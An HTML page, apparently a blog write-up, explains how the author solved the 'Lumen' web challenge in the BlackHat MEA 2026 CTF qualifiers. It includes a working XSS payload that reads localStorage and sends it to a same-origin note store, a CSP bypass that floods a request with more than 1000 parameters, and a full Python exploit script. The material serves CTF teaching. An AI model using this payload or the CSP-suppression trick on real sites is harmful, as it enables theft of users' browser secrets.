@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self' mailto:; upgrade-insecure-requests">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<title>Lumen · BlackHat MEA 2026 writeup</title>
+<meta name="description" content="A 1000 query parameters, which makes PHP print a max_input_vars request-startup warning before the script runs, so.">
+<link rel="canonical" href="https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/lumen/">
+<link rel="alternate" type="application/rss+xml" title="Usama Arshad, Writing" href="/feed.xml">
+<link rel="icon" href="/assets/favicon.ico">
+<link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
+<meta name="theme-color" content="#131110">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Usama Arshad">
+<meta property="og:title" content="Lumen · BlackHat MEA 2026 writeup">
+<meta property="og:description" content="A 1000 query parameters, which makes PHP print a max_input_vars request-startup warning before the script runs, so.">
+<meta property="og:url" content="https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/lumen/">
+<meta property="og:image" content="https://www.usamaarshad.me/assets/og.jpg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:creator" content="@usama0x01">
+<meta name="twitter:title" content="Lumen · BlackHat MEA 2026 writeup">
+<meta name="twitter:description" content="A 1000 query parameters, which makes PHP print a max_input_vars request-startup warning before the script runs, so.">
+<meta name="twitter:image" content="https://www.usamaarshad.me/assets/og.jpg">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "TechArticle",
+  "headline": "Lumen: BlackHat MEA 2026 CTF writeup",
+  "description": "A 1000 query parameters, which makes PHP print a max_input_vars request-startup warning before the script runs, so.",
+  "datePublished": "2026-11-04",
+  "author": {
+    "@type": "Person",
+    "name": "Usama Arshad",
+    "url": "https://www.usamaarshad.me/"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/lumen/"
+  },
+  "articleSection": "Web",
+  "proficiencyLevel": "Expert",
+  "isPartOf": {
+    "@type": "Article",
+    "name": "BlackHat MEA 2026 CTF qualifiers",
+    "url": "https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/"
+  }
+}
+</script>
+<link rel="preload" href="/assets/fonts/fraunces-normal-340-640.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/fonts/inter-normal-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/fonts/jetbrainsmono-normal-400.woff2" as="font" type="font/woff2" crossorigin>
+<script>document.documentElement.classList.add("js");</script>
+<link rel="stylesheet" href="/assets/css/writeup.css">
+</head>
+<body>
+<div class="progress" id="prog" aria-hidden="true"></div>
+<a class="skip" href="#main">Skip to content</a>
+<header class="site-head" id="top">
+  <div class="container head-inner">
+    <a class="wordmark" href="/" aria-label="Usama Arshad, home">Usama Arshad<span class="dot">.</span></a>
+    <nav aria-label="Breadcrumb">
+      <a class="back-link" href="/blog/blackhat-mea-2026-quals/"><span class="arr" aria-hidden="true">←</span><span class="txt">All 15 challenges</span></a>
+    </nav>
+    <a class="btn btn-ghost head-cta" href="/assets/Usama-Arshad-Resume.pdf" download>Résumé</a>
+  </div>
+</header>
+
+<main id="main">
+  <section class="hero" aria-labelledby="pt">
+    <div class="container">
+      <div class="masthead" data-reveal>
+        <p class="masthead-meta">
+          <span>Challenge 13 of 15</span>
+          <span>Web</span>
+          <span class="live">Solved · 100 pts</span>
+        </p>
+      </div>
+      <div class="hero-deck">
+        <div class="deck-copy" data-reveal style="--d:.08s">
+          <p class="kicker">BlackHat MEA 2026 · Qualifiers</p>
+          <h1 class="hero-title" id="pt">Lumen<span class="dot">.</span></h1>
+          <p class="deck">Lumen is a read-only document relay with a content security policy locked down on every page, so the operator is confident that even a stray reflection cannot run. Sign in is not your problem. The operator is, and the operator keeps something valuable in their browser. Find the reflection, get it to run despite the policy, and convince the operator to hand it over.</p>
+          <p class="wu-meta">
+            <span class="cat cat-web">Web</span><span class="sep">·</span>
+            <span>100 points</span><span class="sep">·</span>
+            <span>4 November 2026</span>
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="container">
+      <div class="wu-layout">
+        <article class="wu" data-reveal>
+          <div class="tldr"><p class="lab">TL;DR</p><p>A &lt; is smuggled into the ?p=view 404 reflection across the dir/file parameter boundary, because <code>index.php</code> calls <code>urldecode()</code> on the concatenation after each half was sanitised separately; the strict per-request nonce CSP is then deleted entirely by sending &gt;1000 query parameters, which makes PHP print a max_input_vars request-startup warning before the script runs, so header("Content-Security-Policy: ...") fails with "headers already sent". The resulting unrestricted onerror handler reads the operator bot's localStorage.flag and posts it to the app's own ?p=trace note store, which the attacker reads back.</p></div>
+          <div class="flagbox"><span class="lab">Captured</span><span class="flagval">BHFlagY{406d825cc9c3e881efbaa597ad7591c2}</span><button class="reveal-btn" type="button" aria-label="Reveal flag">Reveal</button></div><div class="flagbox"><span class="lab">Captured</span><span class="flagval">BHFlagY{9cd8ce279fbb943f041641905360ca1c}</span><button class="reveal-btn" type="button" aria-label="Reveal flag">Reveal</button></div><p class="flag-note">Instances are provisioned per run, so these are the values our instances returned.</p>
+          <section id="recon"><h2><span class="hn">01</span>Recon</h2><p>The <code>web_lumen.zip</code> handout contains the whole app:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>web_lumen/Dockerfile
+web_lumen/docker-compose.local.yml
+web_lumen/run                       -&gt; supervisord -c /app/supervisord.conf
+web_lumen/application/run           -&gt; php -S 0.0.0.0:5000 (+ node bot.js)
+web_lumen/application/supervisord.conf
+web_lumen/application/bot.js        (playwright 1.49.1 headless chromium)
+web_lumen/application/public/index.php   (the entire web app, ~120 lines)</code></pre></figure>
+<p><code>index.php</code>, single-file router on?p=, four pages:</p>
+<ul class="bullets"><li>?p=home, form posting p=view&amp;dir=&amp;file=.</li><li>?p=view, the reflection. dir / file go through <code>clean()</code>, then:</li></ul>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>$path = urldecode($dir . $file);
+$key = preg_replace('#^docs/#', '', $path);
+if (isset($DOCS[$key])) { ...htmlspecialchars... }
+else echo '&lt;div class="card"&gt;&lt;p class="err"&gt;404 - no document at &lt;b&gt;'.$path.'&lt;/b&gt;&lt;/p&gt;...';</code></pre></figure>
+<p>The 404 branch echoes $path raw.</p>
+<ul class="bullets"><li>?p=report, POSTs url; accepts anything matching #^https?://#i with no \x00-\x1f, appends it to QUEUE_FILE (default <code>/tmp/lumen/queue</code>) for the bot.</li><li>?p=trace, id must match /^[A-Za-z0-9]{8,64}$/. With note it writes substr($note,0,1024) to TRACE_DIR/$id (cap: 512 files); without note it prints the file inside &lt;pre&gt;. This is a same-origin, attacker-readable write/read channel, no external collaborator server needed.</li></ul>
+<p>Header set on every response (<code>index.php</code>:3):</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>$nonce = bin2hex(random_bytes(16));
+header("Content-Security-Policy: default-src 'none'; script-src 'nonce-$nonce'; style-src 'nonce-$nonce';
+img-src 'self'; base-uri 'none';");</code></pre></figure>
+<p>No unsafe-inline, no unsafe-eval, fresh 32-hex nonce per request, HTML injection alone is inert. Confirmed live:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>Content-Security-Policy: default-src 'none'; script-src 'nonce-9c483c82215a5d2e94d8a9127227f0d6'; style-src
+'nonce-...'; img-src 'self'; base-uri 'none';</code></pre></figure>
+<p><code>bot.js</code>, the operator. Seeds the secret into the browser origin, then visits the reported URL after rewriting its host to itself:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>const SELF = 'http://127.0.0.1:5000';
+function localise(url){ const u = new URL(url); return SELF + u.pathname + u.search + u.hash; }
+await page.goto(SELF + '/?p=home');
+await page.evaluate((f) =&gt; localStorage.setItem('flag', f), FLAG);   // FLAG = /flag.txt
+await page.goto(target); await page.waitForTimeout(4000);</code></pre></figure>
+<p>Because <code>localise()</code> forces the origin back to 127.0.0.1:5000, the payload always executes on the same origin that holds localStorage.flag, so the exfil only needs same-origin JS, and there is no SSRF/ external-host angle to chase.</p>
+<p>application/run, the load-bearing detail:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>exec php -d display_errors=1 -d output_buffering=0 -d max_input_vars=1000 -d variables_order=GPCS -S
+0.0.0.0:5000 -t /app/public</code></pre></figure>
+<p>display_errors=1 + output_buffering=0 + a hard max_input_vars is the planted CSP bypass.</p></section><section id="the-bug"><h2><span class="hn">02</span>The bug</h2><p>Three distinct bugs, all required.</p>
+<ol class="steps"><li>Decode-after-sanitise, split across two parameters (?p=view)</li></ol>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>function clean($s) {
+  if (!is_string($s)) return false;
+  if (preg_match('/%3c/i', $s)) return false;   // blocklist: literal "%3c" only
+  return htmlspecialchars($s, ENT_QUOTES);
+}
+...
+$path = urldecode($dir . $file);                // decode happens AFTER escaping</code></pre></figure>
+<p>Two compounding errors:</p>
+<ul class="bullets"><li><code>urldecode()</code> runs after <code>htmlspecialchars()</code>, so %3e, %22, %27, %26 in the input are resurrected into &gt;, ", ', &amp; in the output, the escaping is undone.</li><li>dir and file are cleaned separately but concatenated before decoding. dir ending in % and file starting in 3c means neither half ever contains the blocked string %3c, yet the joined string does. dir=docs/%25 decodes (by PHP's own $_GET handling) to docs/%; file=3c... stays 3c...; the concatenation is docs/%3c... and <code>urldecode()</code> turns it into docs/&lt;....</li></ul>
+<p>Everything after the smuggled &lt; is supplied double-URL-encoded so it survives two decode passes: $_GET strips one layer (leaving only % -hex and alphanumerics, which pass both the %3c blocklist and htmlspecialchars untouched), and <code>urldecode()</code> strips the second, yielding raw ", =, spaces and &gt; in the echoed $path.</p>
+<ol class="steps" start="2"><li>CSP deletion via max_input_vars startup warning</li></ol>
+<p>max_input_vars=1000 is enforced during PHP request startup, before a line of <code>index.php</code> executes. With display_errors=1 and output_buffering=0, that warning is written straight to the response body, which flushes the HTTP headers. <code>header()</code> on line 3 then cannot run:</p>
+<p>HTTP/1.1 200 OK X-Powered-By: PHP/8.3.33 Content-type: text/html; charset=UTF-8</p>
+<p>&lt;b&gt;Warning&lt;/b&gt;: PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in &lt;b&gt;Unknown&lt;/b&gt; on line &lt;b&gt;0&lt;/b&gt;&lt;br /&gt; &lt;b&gt;Warning&lt;/b&gt;: Cannot modify header information - headers already sent in &lt;b&gt;<code>/app/public/index.php</code>&lt;/b&gt; on line &lt;b&gt;3&lt;/b&gt;&lt;br /&gt;</p>
+<p>No Content-Security-Policy header at all. The nonce architecture is bypassed not by guessing or stealing the nonce but by preventing the policy from ever being sent, inline onerror= then executes normally.</p>
+<ol class="steps" start="3"><li>?p=trace as an unauthenticated shared note store</li></ol>
+<p>Any client can write (&amp;note=) and any client can read (no note) the same id. The bot writes the flag under id=lumenpwn01; the attacker reads it back from the same endpoint. Same-origin, so it also satisfies img-src 'self' had the CSP survived.</p></section><section id="exploitation"><h2><span class="hn">03</span>Exploitation</h2><ol class="steps"><li>Build the injected HTML. Everything after the single smuggled &lt;:</li></ol>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>   img src=x onerror="new Image().src='/?
+p=trace&amp;id=lumenpwn01&amp;note='+encodeURIComponent(localStorage.getItem('flag'))"&gt;</code></pre></figure>
+<p>Double-URL-encode it (quote(quote(s, safe=''), safe='')) so it passes <code>clean()</code> as inert % -hex text and only materialises after <code>urldecode()</code>.</p>
+<ol class="steps" start="2"><li>Smuggle the &lt; across the parameter boundary.</li></ol>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>?p=view&amp;dir=docs/%25&amp;file=3c&lt;double-encoded payload&gt;</code></pre></figure>
+<p>$_GET['dir'] = docs/%, $_GET['file'] = 3cimg%20src%3Dx%20onerror%3D%22...%22%3E. Neither matches / %3c/i; htmlspecialchars is a no-op on both. urldecode("docs/%". "3cimg%20...") yields the live tag. Verified against the local container:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">html</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>   404 - no document at &lt;b&gt;docs/&lt;img src=x onerror="new Image().src='/?
+p=trace&amp;id=lumenpwn01&amp;note='+encodeURIComponent(localStorage.getItem('flag'))"&gt;&lt;/b&gt;</code></pre></figure>
+<ol class="steps" start="3"><li>Kill the CSP. Append 1100 dummy parameters (a0=1&amp;a1=1&amp;…&amp;a1099=1), pushing the request over max_input_vars=1000. Response comes back with the two PHP warnings and no Content-Security- Policy header. Final URL is ~8004 bytes, well inside the PHP built-in server's request-line limit.</li><li>Phish the operator. POST the full URL to?p=report:</li></ol>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">http</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>POST /?p=report   url=http://&lt;host&gt;/?p=view&amp;dir=docs/%25&amp;file=3c…&amp;a0=1&amp;…</code></pre></figure>
+<p>It matches ^https?:// and has no control characters, so it is queued. <code>bot.js</code> picks it up within ~1s, seeds localStorage.flag on http://127.0.0.1:5000/?p=home, rewrites the URL's host via <code>localise()</code> to that same origin, and loads it. The &lt;img src=x&gt; fails, onerror fires with no CSP to stop it, and reads localStorage.getItem('flag') from the bot's own origin.</p>
+<ol class="steps" start="5"><li>Collect. The payload's new Image().src writes the flag to TRACE_DIR/lumenpwn01. Poll:</li></ol>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">http</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>   GET /?p=trace&amp;id=lumenpwn01     -&gt;    &lt;div class="card"&gt;&lt;h1&gt;delivery trace&lt;/h1&gt;&lt;pre&gt;BHFlagY{...}&lt;/pre&gt;&lt;/
+div&gt;</code></pre></figure>
+<ol class="steps" start="6"><li>Result. Local container returned the placeholder BHFlagY{local_test_flag} (no <code>/flag.txt</code>, falls back to DYN_FLAG). Against the live instances, one run each:</li><li>http://k85c055eb8836a37c0d581c3dc51ab1c2.playat.flagyard.com → BHFlagY{406d825cc9c3e881efbaa597ad7591c2}</li><li>http://k9bade1ac79139f00d48a9813d1318e9e.playat.flagyard.com → BHFlagY{9cd8ce279fbb943f041641905360ca1c}</li></ol>
+<p>Full one-shot script: <code>/home/kali/Desktop/CTF/web/Lumen/exploit.py</code> &lt;base-url&gt;</p>
+<p class="codelabel">Key code TRACE_ID = "lumenpwn01"</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">python</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>def dbl(s): # survives $_GET's decode, then index.php's urldecode()
+    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")
+
+js = ("new Image().src='/?p=trace&amp;id=%s&amp;note='"
+      "+encodeURIComponent(localStorage.getItem('flag'))" % TRACE_ID)
+rest = 'img src=x onerror="%s"&gt;' % js       # everything after the single '&lt;'
+
+# '&lt;' is smuggled across the dir/file boundary: clean() never sees "%3c"
+q = "?p=view&amp;dir=docs/%25&amp;file=3c" + dbl(rest)
+# &gt;1000 GET vars -&gt; startup warning is printed -&gt; headers already sent -&gt; no CSP
+q += "&amp;" + "&amp;".join("a%d=1" % i for i in range(1100))
+target = BASE + "/" + q
+
+body = urllib.parse.urlencode({"url": target}).encode()
+urllib.request.urlopen(BASE + "/?p=report", data=body, timeout=15)
+
+for _ in range(20):
+    time.sleep(3)
+    out = get(BASE + "/?p=trace&amp;id=" + TRACE_ID)
+    if "delivery trace" in out:
+        print("[+] " + out.split("&lt;pre&gt;")[1].split("&lt;/pre&gt;")[0]); break</code></pre></figure></section><section id="dead-ends"><h2><span class="hn">04</span>Dead ends</h2><ul class="bullets"><li>The chain was derived statically from the handout and validated in one pass against a local docker compose build, so there were no failed exploitation attempts. The two things that could have burned time were both settled by reading application/run and <code>bot.js</code> rather than by probing:</li><li>Nonce-stealing is a dead end by design. The nonce is bin2hex(random_bytes(16)) regenerated per request and never reflected anywhere reachable, so any approach based on leaking or reusing it fails. The intended primitive is suppressing the header, and the only hint is the deliberately odd -d display_errors=1 -d output_buffering=0 -d max_input_vars=1000 flag set in application/run, easy to skim past when reading only <code>index.php</code>.</li><li>External-host exfiltration is a dead end too. <code>bot.js</code>'s <code>localise()</code> rewrites any submitted URL's origin to http://127.0.0.1:5000, and img-src 'self' would have blocked an outbound beacon anyway;?p=trace is the intended in-band channel.</li><li>Single-URL-encoding the payload does not work: $_GET already performs one decode, so the tag would arrive at <code>clean()</code> as literal &lt; / " / &gt; and be neutralised by htmlspecialchars. The payload must be double-encoded so it is still inert % -hex when <code>clean()</code> inspects it, and only becomes markup at the later <code>urldecode()</code>.</li><li>The local container has no <code>/flag.txt</code>, so it yields only BHFlagY{local_test_flag} from DYN_FLAG, the real flag required running the finished script against the live instance.</li><li>Instances are per-session: the two flags listed correspond to two different playat.flagyard.com hosts, with the identical unmodified exploit run against each.</li></ul></section>
+          <nav class="pager" aria-label="Challenge navigation"><a href="/blog/blackhat-mea-2026-quals/dead-drop/"><span class="dir">← Previous</span><span class="t">Dead Drop</span></a><a class="nx" href="/blog/blackhat-mea-2026-quals/deckforge/"><span class="dir">Next →</span><span class="t">DeckForge</span></a></nav>
+        </article>
+        <aside class="wu-rail">
+          <h2>On this page</h2>
+          <ol><li><a href="#recon">Recon</a></li><li><a href="#the-bug">The bug</a></li><li><a href="#exploitation">Exploitation</a></li><li><a href="#dead-ends">Dead ends</a></li></ol>
+        </aside>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site-foot">
+  <div class="container">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <a class="wordmark" href="/">Usama Arshad<span class="dot">.</span></a>
+        <p>Offensive Security Lead. Red team, AppSec, and cloud security for fintech at scale. Based in Riyadh, Saudi Arabia.</p>
+      </div>
+      <nav class="foot-col" aria-label="Site index">
+        <h2>Index</h2>
+        <ul>
+          <li><a href="/">Portfolio</a></li>
+          <li><a href="/blog/">Writing</a></li>
+          <li><a href="/research/">Research</a></li>
+          <li><a href="/dorks/">Dork library</a></li>
+          <li><a href="/#contact">Contact</a></li>
+        </ul>
+      </nav>
+      <div class="foot-col">
+        <h2>Elsewhere</h2>
+        <ul>
+          <li><a href="https://github.com/usama0x01" target="_blank" rel="noopener">GitHub</a></li>
+          <li><a href="https://wpscan.com/leaderboard/" target="_blank" rel="noopener">WPScan leaderboard</a></li>
+          <li><a href="https://medium.com/@usama0x01" target="_blank" rel="noopener">Medium</a></li>
+          <li><a href="mailto:gusama21@gmail.com">gusama21@gmail.com</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="foot-base">
+      <span>© 2026 Usama Arshad · Riyadh, Saudi Arabia</span>
+      <span class="colophon">Set in Fraunces, Inter &amp; JetBrains Mono, self-hosted · No trackers, no cookies</span>
+      <a href="#top">Back to top ↑</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function () {
+  "use strict";
+  var reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+  var head = document.querySelector(".site-head");
+  function onScroll(){ head.classList.toggle("scrolled", window.scrollY > 8); }
+  window.addEventListener("scroll", onScroll, { passive:true }); onScroll();
+
+  var prog = document.getElementById("prog");
+  if (prog) {
+    var tick = function () {
+      var h = document.documentElement;
+      var max = h.scrollHeight - h.clientHeight;
+      prog.style.width = (max > 0 ? (h.scrollTop / max) * 100 : 0) + "%";
+    };
+    window.addEventListener("scroll", tick, { passive:true });
+    window.addEventListener("resize", tick); tick();
+  }
+
+  var revealEls = Array.prototype.slice.call(document.querySelectorAll("[data-reveal]"));
+  if (reduceMotion || !("IntersectionObserver" in window)) {
+    revealEls.forEach(function (el) { el.classList.add("in"); });
+  } else {
+    var io = new IntersectionObserver(function (es) {
+      es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add("in"); io.unobserve(e.target); } });
+    }, { threshold:0.08, rootMargin:"0px 0px -5% 0px" });
+    revealEls.forEach(function (el) { io.observe(el); });
+    var geo = function () {
+      revealEls.forEach(function (el) {
+        if (!el.classList.contains("in") && el.getBoundingClientRect().top < window.innerHeight*0.95) el.classList.add("in");
+      });
+    };
+    window.addEventListener("scroll", geo, { passive:true });
+    window.addEventListener("resize", geo); geo();
+  }
+
+  document.querySelectorAll(".code-copy").forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      var pre = btn.closest(".code").querySelector("code");
+      var text = pre ? pre.textContent : "";
+      var done = function () {
+        btn.textContent = "Copied"; btn.classList.add("done");
+        setTimeout(function(){ btn.textContent = "Copy"; btn.classList.remove("done"); }, 1400);
+      };
+      if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done, function(){});
+      else {
+        var ta=document.createElement("textarea"); ta.value=text; ta.style.position="absolute"; ta.style.left="-9999px";
+        document.body.appendChild(ta); ta.select();
+        try { document.execCommand("copy"); done(); } catch(e){}
+        document.body.removeChild(ta);
+      }
+    });
+  });
+
+  document.querySelectorAll(".flagbox .reveal-btn").forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      var box = btn.closest(".flagbox");
+      btn.textContent = box.classList.toggle("shown") ? "Hide" : "Reveal";
+    });
+  });
+
+  var rail = document.querySelector(".wu-rail");
+  if (rail && "IntersectionObserver" in window) {
+    var links = Array.prototype.slice.call(rail.querySelectorAll("a"));
+    var secs = links.map(function (a) { return document.querySelector(a.getAttribute("href")); }).filter(Boolean);
+    var spy = new IntersectionObserver(function (entries) {
+      entries.forEach(function (e) {
+        if (!e.isIntersecting) return;
+        links.forEach(function (a) { a.classList.toggle("on", a.getAttribute("href") === "#" + e.target.id); });
+      });
+    }, { rootMargin:"-20% 0px -70% 0px" });
+    secs.forEach(function (s) { spy.observe(s); });
+  }
+})();
+</script>
+</body>
+</html>
